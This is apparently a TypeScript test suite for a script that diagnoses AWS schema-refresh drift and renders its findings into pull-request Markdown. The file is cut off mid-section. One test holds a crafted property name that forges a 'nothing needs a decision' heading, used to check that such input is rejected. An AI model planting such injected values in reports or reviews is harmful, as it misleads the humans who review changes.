/**
 * The refresh pull request's own diagnosis — `scripts/diagnose-schema-refresh.mjs`.
 *
 * The job opens a PR that may be RED by design, and before this script the PR
 * said only that such a class exists: finding out which property, on which
 * type, declared where, meant reading two checkers' CI output. All of that is
 * mechanical, so it is computed and written into the PR.
 *
 * The suite is shaped by the two ways this script can be WORSE than saying
 * nothing, both of which it did during development against real drift:
 *
 * 1. **A confident wrong answer.** Looking a property name up across every
 *    provider made `AWS::CodeCommit::Repository.Id` report evidence from
 *    `@aws-sdk/client-cloudfront`, because that file sorted first. Lookups are
 *    now scoped to the provider that actually serves the type.
 * 2. **A silent empty.** The declared-property parse missed `new Set<string>([`
 *    and returned nothing, which filtered every removal away and rendered
 *    "nothing needs a decision" over a PR that did. That parse now refuses to
 *    return an empty map for a non-empty module.
 *
 * Both are pinned below, and the real-repo cases are anchored on the actual
 * `register-providers.ts` and the actual generated coverage module, because a
 * synthetic fixture for either would encode the same assumption the parser
 * makes.
 */
import { describe, it, expect, beforeAll } from 'vite-plus/test';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  cpSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  comparePropertySets,
  findDeclarationCandidates,
  mapTypesToProviderFiles,
  parseDeclaredProperties,
  pairRenames,
  NESTED_KEY_FAILURE_RE,
  parseNestedKeyDivergences,
  renderDetail,
  renderKey,
  buildSdkLag,
  classifyRemovedProperty,
  countDecisions,
  partitionSettledRemovals,
  parseDefinitionMemberMissing,
  partitionPendingSdkBump,
  pendingBumpGroups,
  writeAutoTolerated,
  loadEvidenceDeps,
  classifyArgs,
  UMBRELLA_EMPTY_SENTINEL,
  renderUmbrellaChecklist,
  renderUmbrellaDocument,
  CHECK_GUIDANCE,
  KNOWN_FLAGS,
  classifyGitShowFailure,
  assertFixtureFloor,
  collectFixtureDeltas,
  loadDeclaredProperties,
  UNREADABLE,
  clientsForType,
  sdkClientVersions,
  renderDiagnosis,
  renderName,
  sdkModelsMember,
  sdkVersionLag,
} from '../../../scripts/diagnose-schema-refresh.mjs';
// The OTHER reader of `bogusTolerated`, imported so the confluence case below
// asserts against the real oracle rather than a restatement of it: the #3005
// defect was two definitions of "settled", and a second copy here would be a
// third.
import { classifyCoverage } from '../provisioning/_property-coverage-utils.js';
import {
  providerWiresProperty,
  typedSdkMember,
} from '../../../scripts/offline-property-evidence.ts';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

const fixture = (properties: string[], readOnly: string[] = []) =>
  JSON.stringify({
    resourceType: 'AWS::Test::Type',
    generatedAt: '2026-01-01',
    properties,
    readOnlyProperties: readOnly,
  });

describe('comparePropertySets', () => {
  it('separates removals, additions, and the writable subset of additions', () => {
    // The writable split is the load-bearing one: a read-only addition can
    // never be a dropped value, because there was nothing to send.
    const delta = comparePropertySets(
      fixture(['Keep', 'Gone']),
      fixture(['Keep', 'NewWritable', 'NewReadOnly'], ['NewReadOnly'])
    );
    expect(delta.removed).toEqual(['Gone']);
    expect(delta.added).toEqual(['NewWritable', 'NewReadOnly']);
    expect(delta.writableAdded).toEqual(['NewWritable']);
  });

  it('reports nothing for an unchanged type', () => {
    const delta = comparePropertySets(fixture(['A']), fixture(['A']));
    expect(delta).toEqual({ removed: [], added: [], writableAdded: [] });
  });
});

describe('parseNestedKeyDivergences', () => {
  it('captures the finding line FIELD BY FIELD, not as one opaque string', () => {
    // `nestedKey` reaches Markdown, and it comes from the un-checksummable
    // bundle by way of the fixtures — so it has to arrive as its own field for
    // the render guard to have anything to guard.
    const { divergences, unparsedFailure } = parseNestedKeyDivergences(
      [
        'nested-key-coverage: FAILED',
        '  AWS::Glue::Connection: OAuth2Credentials [definition-member-missing] (SDK interface `OAuth2Properties` has no member)',
        '  AWS::ECS::Service: someKey [case-divergence] (SDK models `SomeKey`)',
        'some unrelated trailing line',
      ].join('\n')
    );
    expect(unparsedFailure).toBe(false);
    expect(divergences).toHaveLength(2);
    expect(divergences[0]!.resourceType).toBe('AWS::Glue::Connection');
    expect(divergences[0]!.nestedKey).toBe('OAuth2Credentials');
    expect(divergences[0]!.bucket).toBe('definition-member-missing');
    expect(divergences[0]!.detail).toContain('has no member');
    expect(divergences[1]!.bucket).toBe('case-divergence');
    expect(divergences[1]!.nestedKey).toBe('someKey');
  });

  it('returns nothing, and no failure flag, for output with no findings', () => {
    expect(parseNestedKeyDivergences('nested-key-coverage: OK — 0 divergences')).toEqual({
      divergences: [],
      unparsedFailure: false,
    });
  });

  it('FLAGS a failure it could not read, in every mode the checker announces one', () => {
    // The checker's four FAIL verdicts and its crash path all legitimately
    // print no finding line this parser recognises. Throwing on them discarded
    // the whole diagnosis; returning a bare `[]` rendered "additions only" over
    // a red check. Both were shipped; the flag is the third answer.
    for (const failing of [
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.',
      'nested-key-coverage: FAIL — stale NESTED_KEY_ALLOW_LIST entr(ies) match no audited key',
      'nested-key-coverage: FAIL — stale segmentRenames entr(ies) no longer resolve anything',
      'nested-key-coverage: FAIL — stale terminalRenames entr(ies): the un-renamed terminal',
      'nested-key-coverage: failed — Cannot find module',
    ]) {
      const out = parseNestedKeyDivergences(failing);
      expect(out.divergences).toEqual([]);
      expect(out.unparsedFailure, `did not flag: ${failing}`).toBe(true);
    }
  });

  it('flags a PARTIAL parse, not only a total one', () => {
    // The same correction `parseDeclaredProperties` needed one round earlier,
    // in the sibling parser: gated on `length === 0`, a producer change
    // touching SOME lines dropped them and the report rendered the survivors
    // with no warning. Two of these five parse strictly; three do not.
    const out = parseNestedKeyDivergences(
      [
        'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.',
        '  AWS::ECS::Service: someKey [case-divergence]',
        '  AWS::Glue::Connection: OAuth2Props [no-sdk-member]',
        '  AWS::S3::Bucket: a key with spaces [no-sdk-member]',
        '  AWS::S3::Bucket: Some.Key [newBucket]',
        '  AWS::S3::Bucket: Other.Key [no-sdk-member] (detail).',
      ].join('\n')
    );
    expect(out.divergences.length).toBe(2);
    expect(out.unparsedFailure, 'three findings were dropped silently').toBe(true);
  });

  it('flags a checker that failed with NO announcement at all, via its exit code', () => {
    // An empty log, a `task not found` and an OOM kill carry nothing to grep
    // for, and all three rendered "additions only" over a checker that never
    // ran. The status is the other half of the question.
    for (const output of ['', 'error: task "audit:nested-key-coverage:check" not found\n']) {
      expect(parseNestedKeyDivergences(output, 1).unparsedFailure, `rc=1: ${output}`).toBe(true);
      expect(parseNestedKeyDivergences(output, 0).unparsedFailure, `rc=0: ${output}`).toBe(false);
    }
  });

  it('does not flag a failure when it DID read findings out of one', () => {
    const out = parseNestedKeyDivergences(
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.\n' +
        '  AWS::ECS::Service: someKey [case-divergence]\n'
    );
    expect(out.divergences).toHaveLength(1);
    expect(out.unparsedFailure).toBe(false);
  });

  it('pins its failure pattern against the checker that produces the text', () => {
    // Nothing else joins the two files. A reword in `gen-nested-key-coverage.ts`
    // would make the pattern inert, and an inert pattern renders a failing
    // check as "additions only" — the silent-clean verdict this job exists to
    // prevent.
    const producer = readFileSync(
      join(REPO_ROOT, 'scripts/gen-nested-key-coverage.ts'),
      'utf8'
    );
    const announcements = [...producer.matchAll(/nested-key-coverage: (?:FAIL|failed)/g)].map(
      (m) => m[0]
    );
    expect(announcements.length, 'the checker no longer announces failure this way').toBeGreaterThanOrEqual(5);
    for (const announcement of new Set(announcements)) {
      expect(NESTED_KEY_FAILURE_RE.test(announcement), `unmatched: ${announcement}`).toBe(true);
    }
  });
});

describe('parseDeclaredProperties', () => {
  const REAL_GENERATED = join(REPO_ROOT, 'src/provisioning/property-coverage.generated.ts');

  it('reads the REAL generated module, including its `new Set<string>([` shape', () => {
    // Anchored on the real module: a synthetic sample would be written to match
    // whatever the parser expects, which is exactly how the `<string>` type
    // argument was missed.
    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
    // Compared against the module's OWN entry count, not a floor. A floor of
    // 100 was blind to the real defect: 131 of 134 parsed, three types silently
    // absent and two credited with a NEIGHBOUR's properties, because a type
    // whose set is `new Set<string>()` has no `[` for the lazy match to stop at.
    const entryCount = (readFileSync(REAL_GENERATED, 'utf8').match(/\[\s*'AWS::[\w:]+',\s*\{/g) ?? [])
      .length;
    expect(entryCount).toBeGreaterThan(100);
    expect(declared.size).toBe(entryCount);
    // The two types the partial parse mis-credited, pinned by name.
    expect(declared.get('AWS::CloudFormation::WaitConditionHandle')!.size).toBe(0);
    expect(declared.get('AWS::BedrockAgentCore::Evaluator')!.has('EvaluatorConfig')).toBe(true);
    const route53 = declared.get('AWS::Route53::RecordSet');
    expect(route53, 'AWS::Route53::RecordSet left the generated table').toBeDefined();
    expect(route53!.has('AliasTarget')).toBe(true);
  });

  it('REFUSES a non-empty module it parsed nothing from', () => {
    // The failure that shipped for one revision. An empty map here filters
    // every removal away and renders "nothing needs a decision" over a PR that
    // does — worse than crashing, because it reads as a clean report.
    expect(() => parseDeclaredProperties('export const X = 1;\n')).toThrow(
      /parsed to zero types/
    );
  });

  it('REFUSES a module whose declaration shape it no longer recognises', () => {
    // The guard that shipped compared `declared.size` against `boundaries.length`,
    // and `declared.set` runs once per boundary — so it could only ever fire on
    // a DUPLICATE type name. Measured against the real module: renaming the
    // member emptied all 134 sets with no refusal at all, which filters every
    // removal away and renders "nothing needs a decision" over a red check.
    const mutated = readFileSync(REAL_GENERATED, 'utf8').replaceAll('handled:', 'handledProps:');
    expect(() => parseDeclaredProperties(mutated)).toThrow(/recognised the declaration shape/);
  });

  it('REFUSES a PARTIAL shortfall, not only a total collapse', () => {
    // The motivating measurement was partial — 131 of 134 parsed, three
    // swallowed and two credited with a neighbour's properties — and a guard
    // reading `recognised === 0` covers none of that while passing the
    // total-collapse case above. One entry is enough to refuse.
    const real = readFileSync(REAL_GENERATED, 'utf8');
    // Inside an ENTRY, not the first occurrence in the file: the module has 135
    // `handled:` occurrences and 134 entries, because the type declaration
    // carries one too. Renaming that one changes no entry, and this case failed
    // green-side until it did — the same off-by-one the parser itself has to
    // get right.
    const firstEntry = real.search(/\[\s*'AWS::[\w:]+',\s*\{/);
    expect(firstEntry, 'no type entry found').toBeGreaterThan(-1);
    const at = real.indexOf('handled:', firstEntry);
    expect(at, 'the generated module no longer uses this shape').toBeGreaterThan(-1);
    const mutated = real.slice(0, at) + 'handledProps:' + real.slice(at + 'handled:'.length);
    // Still overwhelmingly parseable — this is not a collapse.
    expect(parseDeclaredProperties(real).size).toBeGreaterThan(100);
    expect(() => parseDeclaredProperties(mutated)).toThrow(/recognised the declaration shape/);
  });

  it('accepts a type declaring NOTHING, which is not the same as an unread one', () => {
    // `new Set<string>()` has no `[`, so it matches neither the populated shape
    // nor a naive "did we extract names" test. Counting it as unrecognised
    // would refuse the real module outright.
    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
    const empties = [...declared.values()].filter((set) => set.size === 0).length;
    expect(empties, 'no empty-set entry left — this case no longer covers that shape').toBeGreaterThan(0);
  });

  it('REFUSES a MISSING module rather than reading it as an empty one', () => {
    // `parseDeclaredProperties('')` legitimately returns an empty map, so the
    // caller's absent-file-to-`''` conversion made a missing module mean "no
    // provider declares anything" — which filters every removal away and
    // renders the clean verdict.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-noroot-'));
    try {
      expect(() => loadDeclaredProperties(dir)).toThrow(/is missing/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('loads the real module through the same path main() uses', () => {
    // Otherwise the refusal above is the only thing exercised, and a broken
    // read would look like a passing refusal test.
    expect(loadDeclaredProperties().size).toBeGreaterThan(100);
  });

  it('returns an empty map for genuinely empty input, without throwing', () => {
    expect(parseDeclaredProperties('').size).toBe(0);
  });
});

describe('mapTypesToProviderFiles', () => {
  const REAL_REGISTER = join(REPO_ROOT, 'src/provisioning/register-providers.ts');

  it('resolves both registration shapes against the REAL registration file', () => {
    const map = mapTypesToProviderFiles(readFileSync(REAL_REGISTER, 'utf8'));
    expect(map.size).toBeGreaterThan(100);
    // Registered from a shared local (`const route53Provider = new Route53Provider()`).
    expect(map.get('AWS::Route53::RecordSet')).toBe(
      'src/provisioning/providers/route53-provider.ts'
    );
    // Registered with a fresh instance inline.
    expect(map.get('AWS::CodeCommit::Repository')).toBe(
      'src/provisioning/providers/codecommit-repository-provider.ts'
    );
  });

  it('returns nothing for a source with no registrations', () => {
    expect(mapTypesToProviderFiles('export function registerAllProviders() {}').size).toBe(0);
  });
});

describe('findDeclarationCandidates', () => {
  it('is scoped to the provider serving the type, not the whole directory', () => {
    // The confident-wrong-answer case. Unscoped, `Id` matched 50+ lines across
    // 20 providers; scoped, it can only report the file that owns the type.
    // `AliasTarget`, not `GeoProximityLocation`: the latter is the property this
    // very refresh cycle removes, so following the runbook's own remedy would
    // red this test with a message about the diagnosis script rather than about
    // the classification.
    const hits = findDeclarationCandidates(
      'AliasTarget',
      'src/provisioning/providers/route53-provider.ts',
      'AWS::Route53::RecordSet',
      REPO_ROOT
    );
    expect(hits.length).toBeGreaterThan(0);
    for (const hit of hits) {
      expect(hit.startsWith('src/provisioning/providers/route53-provider.ts:')).toBe(true);
    }
  });

  it('returns nothing rather than guessing when the owning provider is unknown', () => {
    expect(findDeclarationCandidates('Whatever', undefined, undefined, REPO_ROOT)).toEqual([]);
  });

  it('scopes to the TYPE block inside a provider file serving several types', () => {
    // 17 provider files serve more than one type; `ec2-provider.ts` serves 15.
    // Unscoped, asking about `Tags` on one Glue type returned every `'Tags'` in
    // the file, including other Glue types' declarations.
    // The PROPERTY is what makes this discriminate, and two rounds picked one
    // that could not. `ConnectionInput` occurs only inside this type's own
    // block, so scoped, unscoped and file-wide were the same answer and BOTH
    // window bounds could be deleted with every case still green (measured).
    // `Name` occurs before the block, inside it, and after it, so deleting the
    // START bound and deleting the END bound each fail a different assertion
    // below.
    const type = 'AWS::Glue::Connection';
    const file = 'src/provisioning/providers/glue-provider.ts';
    const scoped = findDeclarationCandidates('Name', file, type, REPO_ROOT);
    const unscoped = findDeclarationCandidates('Name', file, undefined, REPO_ROOT);
    expect(scoped.length, 'the type block yielded nothing — scoping window is wrong').toBeGreaterThan(0);
    // Strictly wider, not merely no narrower: an equal count means the property
    // is confined to the block and the case cannot see a missing bound at all.
    expect(
      unscoped.length,
      'unscoped == scoped — this property cannot discriminate; pick one that occurs outside the block'
    ).toBeGreaterThan(scoped.length);
    // Every scoped hit must sit inside the block, i.e. at or after the type's
    // own literal — deleting the window's END makes this fail on a later type.
    const lines = readFileSync(join(REPO_ROOT, file), 'utf8').split('\n');
    const start = lines.findIndex((l) => l.includes(`'${type}'`));
    const nextType = lines.findIndex(
      (l, i) => i > start && /'AWS::[A-Za-z0-9]+::[A-Za-z0-9]+'/.test(l)
    );
    for (const hit of scoped) {
      const lineNo = Number(hit.split(':')[1]);
      expect(lineNo).toBeGreaterThan(start);
      if (nextType !== -1) expect(lineNo).toBeLessThanOrEqual(nextType);
    }
  });
});

describe('sdkModelsMember', () => {
  it('consults the client the OWNING provider imports', () => {
    const evidence = sdkModelsMember(
      'AliasTarget',
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(evidence, 'no SDK client resolved for the Route53 provider').toBeDefined();
    // The whole point of deriving the client from the provider's own imports:
    // CFn spells it `Route53`, the SDK spells it `route-53`, and no
    // hand-maintained table is involved.
    expect(evidence!.client).toBe('@aws-sdk/client-route-53');
    expect(evidence!.modelled).toBe(true);
  });

  it('reports NOT modelled for a name no client carries', () => {
    const evidence = sdkModelsMember(
      'CdkdDefinitelyNotAnSdkMemberName',
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(evidence!.modelled).toBe(false);
  });

  it('is CASE-INSENSITIVE — the defect that leaned toward deleting a live declaration', () => {
    // A real-repo anchor, not a synthetic one: `@aws-sdk/client-api-gateway`
    // spells the member `restApiId` and carries no PascalCase spelling anywhere
    // in its models. Case-sensitively, `RestApiId` came back `modelled: false`,
    // and the report then said both of AWS's descriptions had dropped it —
    // encouraging deletion of a property the API very much still takes.
    const evidence = sdkModelsMember(
      'RestApiId',
      'src/provisioning/providers/apigateway-provider.ts',
      REPO_ROOT
    );
    expect(evidence, 'no SDK client resolved for the API Gateway provider').toBeDefined();
    expect(evidence!.modelled).toBe(true);
  });

  it('consults EVERY imported client, not just the first', () => {
    // 14 provider files import 2-4 clients. Reading the first is only
    // coincidentally right today, and an import reformat would flip the
    // evidence to the wrong service silently — the first defect returning
    // through a side door.
    // A name present in NO client, so the scan cannot stop at the first —
    // `consulted` then records everything it actually looked at.
    const evidence = sdkModelsMember(
      'CdkdNoSuchMemberAnywhere',
      'src/provisioning/providers/lambda-function-provider.ts',
      REPO_ROOT
    );
    expect(evidence!.modelled).toBe(false);
    expect(evidence!.consulted!.length).toBeGreaterThan(1);
  });

  it('refuses a property name it would have to rewrite to search for', () => {
    // Scrubbing non-alphanumerics turns the needle into a different question.
    expect(
      sdkModelsMember('Foo.Bar', 'src/provisioning/providers/route53-provider.ts', REPO_ROOT)
    ).toBeUndefined();
  });

  it('answers undefined rather than guessing when the provider is unknown', () => {
    expect(sdkModelsMember('X', undefined, REPO_ROOT)).toBeUndefined();
  });
});

describe('sdkVersionLag', () => {
  it('settles the lag question in both directions', () => {
    // The one branch of the divergence decision that IS decidable: current
    // means the lag reading is eliminated, not merely unlikely.
    expect(sdkVersionLag('x', '3.1.0', () => '3.9.0\n')).toEqual({
      installed: '3.1.0',
      latest: '3.9.0',
      behind: true,
    });
    expect(sdkVersionLag('x', '3.9.0', () => '3.9.0\n')!.behind).toBe(false);
  });

  it('degrades to silence on a network failure or junk answer', () => {
    // A diagnosis must never fail the job it describes.
    expect(
      sdkVersionLag('x', '3.1.0', () => {
        throw new Error('offline');
      })
    ).toBeUndefined();
    expect(sdkVersionLag('x', '3.1.0', () => 'npm ERR! 404')).toBeUndefined();
    expect(sdkVersionLag('x', undefined, () => '3.9.0')).toBeUndefined();
  });
});

describe('pairRenames', () => {
  /**
   * The PAIRING is tested, not the renderer's reaction to a hand-fed result.
   * The earlier case passed `renameCandidates: []` into `renderDiagnosis` and
   * asserted no rename appeared — trivially true, and it left the actual rule
   * unpinned: reverting it to "every writable addition is a rename" kept all 37
   * cases green.
   */
  it('pairs a removal with a similarly-named addition', () => {
    expect(pairRenames('Id', ['RepositoryId'])).toEqual(['RepositoryId']);
    expect(pairRenames('GeoProximityLocation', ['GeoProximityLocationV2'])).toEqual([
      'GeoProximityLocationV2',
    ]);
  });

  it('refuses an empty name rather than pairing it with everything', () => {
    // `''.endsWith('')` is true, so an empty needle matched every addition and
    // would have claimed each one a rename of a nameless property.
    expect(pairRenames('', ['Alpha', 'Beta'])).toEqual([]);
  });

  it('does NOT pair an unrelated addition', () => {
    // The surviving mutation the old test could not see: unconditional pairing
    // told the maintainer that `Tags` and `Name` were `Id` renamed.
    expect(pairRenames('Id', ['Tags', 'Name', 'CapacityProviderConfiguration'])).toEqual([]);
  });

  it('is PREFIX/SUFFIX, not containment — the rule the rename signal rests on', () => {
    // `CapacityProviderConfiguration` above cannot discriminate: it justifies
    // itself with "`Id` is inside Prov-id-er", true only case-INsensitively,
    // while `pairRenames` is case-sensitive — so reverting the rule to
    // `includes()` left all 118 cases green. `ProviderIdentity` CONTAINS `Id`
    // and neither starts nor ends with it, so it separates the two rules.
    expect(
      'CapacityProviderConfiguration'.includes('Id'),
      'the old anchor still cannot discriminate'
    ).toBe(false);
    expect('ProviderIdentity'.includes('Id'), 'this anchor no longer contains the needle').toBe(
      true
    );
    expect(pairRenames('Id', ['ProviderIdentity'])).toEqual([]);
    // The accepted twin, so a rule that pairs NOTHING also fails.
    expect(pairRenames('Id', ['RepositoryId', 'IdArn'])).toEqual(['RepositoryId', 'IdArn']);
  });

  it('pairs nothing when the refresh added nothing writable', () => {
    // Read-only additions never reach here — a declaration cannot target one.
    expect(pairRenames('Id', [])).toEqual([]);
  });
});

describe('renderName', () => {
  it('rejects a name carrying Markdown rather than rendering it', () => {
    // Property names come from an artifact this job documents as
    // TLS-trusted-only. A crafted key can close the backtick span and forge a
    // "nothing needs a decision" heading in the PR body and the umbrella issue
    // comment — attacking the human-review half of that accepted residual.
    expect(renderName('WarmUpConfiguration')).toBe('`WarmUpConfiguration`');
    const poisoned = renderName('Foo`\n\n## Nothing in this refresh needs a decision');
    expect(poisoned).not.toContain('##');
    expect(poisoned).toContain('rejected');
  });
});

describe('renderDiagnosis', () => {
  const removedEntry = {
    resourceType: 'AWS::Route53::RecordSet',
    properties: ['GeoProximityLocation'],
    candidates: { GeoProximityLocation: ['src/provisioning/providers/route53-provider.ts:274'] },
    sdk: {
      GeoProximityLocation: {
        client: '@aws-sdk/client-route-53',
        modelled: true,
        version: '3.1018.0',
      },
    },
  };

  it('names the property, the site, and which way the SDK evidence leans', () => {
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('GeoProximityLocation');
    expect(md).toContain('route53-provider.ts:274');
    expect(md).toContain('@aws-sdk/client-route-53');
    expect(md).toContain('still models this name');
    expect(md).toContain('bogusTolerated');
    expect(md).toContain('3.1018.0');
  });

  it('leans the other way — and warns about renames — when the SDK dropped it too', () => {
    const md = renderDiagnosis({
      removed: [
        {
          ...removedEntry,
          sdk: { GeoProximityLocation: { client: '@aws-sdk/client-route-53', modelled: false } },
        },
      ],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('no longer models this name');
    expect(md).toContain('retiring the declaration');
    // A rename is indistinguishable here, and saying so is what keeps the
    // evidence from reading as a verdict.
    expect(md).toContain('rename would look identical');
  });

  it('says so plainly when no evidence could be gathered', () => {
    const md = renderDiagnosis({
      removed: [{ ...removedEntry, sdk: { GeoProximityLocation: undefined } }],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('SDK evidence: none');
  });

  it('flags a RENAME when the same refresh added a name to the same type', () => {
    // The single most decisive signal available, and it was missed at first:
    // a rename is a removal and an addition arriving TOGETHER, and both sides
    // are in hand. Measured on real drift, `AWS::CodeCommit::Repository`
    // dropped `Id` and gained `RepositoryId` in one cycle.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::CodeCommit::Repository',
          properties: ['Id'],
          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
          sdk: { Id: { client: '@aws-sdk/client-codecommit', modelled: false, version: '3.0.0' } },
          renameCandidates: { Id: ['RepositoryId'] },
        },
      ],
      writableAdded: [
        { resourceType: 'AWS::CodeCommit::Repository', properties: ['RepositoryId'] },
      ],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Possibly a RENAME');
    expect(md).toContain('RepositoryId');
  });

  it('does NOT call a READ-ONLY addition a rename, whatever the caller passed', () => {
    // A declaration cannot be pointed at a read-only property, so this advice
    // cannot be followed. The caller filters to writable additions and that
    // filter had NO pin: swapping its argument for the unfiltered list left
    // every case green. Re-checked in the renderer, where both sides are in
    // hand, the class is closed whatever the caller passes.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::CodeCommit::Repository',
          properties: ['Id'],
          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
          renameCandidates: { Id: ['RepositoryId'] },
        },
      ],
      // `RepositoryId` arrived READ-ONLY: absent from writableAdded entirely.
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('Possibly a RENAME');
    expect(md).not.toContain('RepositoryId');
  });

  it('does NOT claim a rename when the refresh added nothing to that type', () => {
    const md = renderDiagnosis({
      removed: [{ ...removedEntry, renameCandidates: { GeoProximityLocation: [] } }],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('a RENAME');
  });

  it('carries the installed SDK version, since "not modelled" is only as current as it', () => {
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('3.1018.0');
  });

  it('gives paste-able steps for BOTH classes, not just a classification', () => {
    // A report that classifies without saying what to run has handed over a
    // question, not the work.
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'definition-member-missing', detail: '' },
      ],
      skipped: [],
    });
    expect(md).toContain('aws cloudformation describe-type');
    expect(md).toContain('vp test run property-coverage');
    // The SDK-lag check is the step that answers the one question the evidence
    // cannot; without it an allow-list entry can be added over a stale SDK.
    expect(md).toContain('npm view @aws-sdk/client-');
    expect(md).toContain('audit:nested-key-coverage:check');
  });

  it('says the lag reading is RULED OUT when the client is current', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
      ],
      skipped: [],
      sdkLag: [
        {
          client: '@aws-sdk/client-glue',
          resourceType: 'AWS::Glue::Connection',
          installed: '3.9.0',
          latest: '3.9.0',
          behind: false,
          matched: true,
        },
      ],
    });
    expect(md).toContain('is current');
    expect(md).toContain('ruled out');
  });

  it('says the lag reading is LIVE, without claiming a bump would fix it', () => {
    // "Bumping would fix this" is not answerable by a name lookup — measured:
    // the live Glue divergence names ARE present in both the installed and the
    // latest client, because the checker's finding is interface-level.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
      ],
      skipped: [],
      sdkLag: [
        {
          client: '@aws-sdk/client-glue',
          resourceType: 'AWS::Glue::Connection',
          installed: '3.1018.0',
          latest: '3.1127.0',
          behind: true,
          matched: true,
        },
      ],
    });
    expect(md).toContain('3.1018.0');
    expect(md).toContain('3.1127.0');
    expect(md).toContain('LIVE');
    expect(md).not.toContain('would fix');
  });

  it('omits the SDK-lag step when every divergence is a case-divergence', () => {
    // There is no judgement in a case divergence — the SDK has the key under a
    // different capitalisation — so the lag question does not arise.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::ECS::Service', nestedKey: 'SomeKey', bucket: 'case-divergence', detail: '' },
      ],
      skipped: [],
    });
    expect(md).toContain('case-divergence` means the SDK models the key');
    expect(md).not.toContain('npm view');
  });

  it('names read-only additions as needing nothing, since the diff still shows them', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 6,
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Read-only properties AWS added (6)');
    expect(md).toContain('nothing to do');
  });

  it('reports an additions-only cycle as needing no decision', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::CloudWatch::Alarm', properties: ['WarmUpConfiguration'] }],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Nothing in this refresh needs a decision');
    expect(md).toContain('WarmUpConfiguration');
    expect(md).toContain('no decision needed');
  });

  it('always closes by naming who chooses what is left, and why', () => {
    // The closing note used to say the decision is "deliberately not made
    // here", and that stopped being true when the job started settling the
    // removals with no uncertainty to resolve (go-to-k/cdkd#2774). What still
    // has to reach every reader is the ASYMMETRY the note exists for — the
    // silencing option always turns CI green — plus the bound that makes an
    // automatic answer defensible: it fires only where the evidence leaves one
    // possible answer, never under uncertainty.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('chosen by you');
    expect(md).toContain('UNCERTAINTY');
    expect(md, 'the closing note no longer says what the job settles itself').toMatch(
      /reachable from an operation\nINPUT in this type’s own client/
    );
    expect(md, 'the closing note no longer names the wiring test').toMatch(
      /the provider READS it off the template/
    );
    // The half a review added, and the reason the wording moved: the note used
    // to describe the rule as "the SDK still declares the member AND the
    // provider still wires it", and BOTH of those read an absence as a finding.
    // A member on a response-only model is declared and unsendable, and a
    // provider with no `properties['X']` read may still deliver the value from
    // a lookup table. The note now says what the absence means.
    expect(md, 'the note no longer says an absence concludes nothing').toContain(
      'Absent evidence is never'
    );
    expect(md, 'the retired claim is back').not.toContain('deliberately not made here');
    expect(md, 'the retired, unsound summary of the rule is back').not.toMatch(
      /SDK still declares the member AND the provider still/
    );
  });

  it('renders every divergence field, and names both options', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        {
          resourceType: 'AWS::Glue::Connection',
          nestedKey: 'OAuth2Properties.OAuth2Credentials',
          bucket: 'definition-member-missing',
          detail: 'SDK interface `OAuth2Properties` has no member',
        },
      ],
      skipped: [],
    });
    expect(md).toContain('AWS::Glue::Connection');
    expect(md).toContain('OAuth2Properties.OAuth2Credentials');
    expect(md).toContain('definition-member-missing');
    // The detail survives, minus the characters that could end the line early.
    expect(md).toContain('has no member');
    expect(md).toContain('NESTED_KEY_ALLOW_LIST');
    expect(md).toContain('installed');
  });

  it('lists types the public bundle does not carry', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      skipped: ['AWS::BedrockAgentCore::Browser'],
    });
    expect(md).toContain('AWS::BedrockAgentCore::Browser');
    expect(md).toContain('Not refreshed');
  });
});

describe('the render guards, at every site that reaches Markdown', () => {
  // The guard existed and was enforced at ONE of five call sites: reverting the
  // other four to raw interpolation left every case green. This drives one
  // diagnosis carrying a hostile name in EVERY name-bearing position and counts
